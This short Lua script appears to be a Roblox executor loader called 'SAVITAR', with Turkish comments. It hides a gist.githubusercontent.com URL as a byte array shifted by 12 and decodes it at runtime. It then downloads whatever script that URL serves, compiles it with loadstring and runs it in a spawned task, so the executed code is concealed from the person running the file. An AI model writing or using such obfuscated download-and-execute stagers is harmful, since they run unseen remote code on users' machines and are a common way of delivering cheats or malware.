local _S = string; local _T = table; local _G = game;
local _D = {116,128,128,124,127,70,59,59,115,117,127,128,58,115,117,128,116,129,110,129,127,113,126,111,123,122,128,113,122,128,58,111,123,121,59,67,95,109,130,117,128,109,126,59,63,65,109,66,113,112,109,113,114,68,114,62,114,66,69,67,62,114,62,114,62,63,68,68,65,111,110,111,63,61,62,113,59,126,109,131,59,110,61,69,110,109,110,112,113,60,60,109,69,63,60,62,63,64,112,65,61,112,111,111,62,113,114,112,111,63,62,61,114,67,113,112,112,113,61,69,65,59,82,96,77,92,57,95,77,98,85,96,77,94,57,84,97,78,57,78,81,96,77}
local _K = 12

local function _LOAD(_DATA)
    local _U = ""
    for _i=1, #_DATA do
        _U = _U .. _S.char(_DATA[_i] - _K)
    end
    
    local _OK, _RES = pcall(function()
        return _G:HttpGet(_U .. "?cache=" .. math.random(1,9999))
    end)
    
    if _OK and _RES then
        -- PARÇALI YÜKLEME (Line 1 hatasını kökten çözer)
        local _F, _E = loadstring(_RES, "SAVITAR_CORE")
        if _F then
            task.spawn(_F)
        else
            -- Eğer burada hata alıyorsan ana kodun (Gist'teki) bozuktur
            _G:GetService("TestService"):Message("SAVITAR ERROR: " .. tostring(_E))
        end
    end
end

_LOAD(_D)
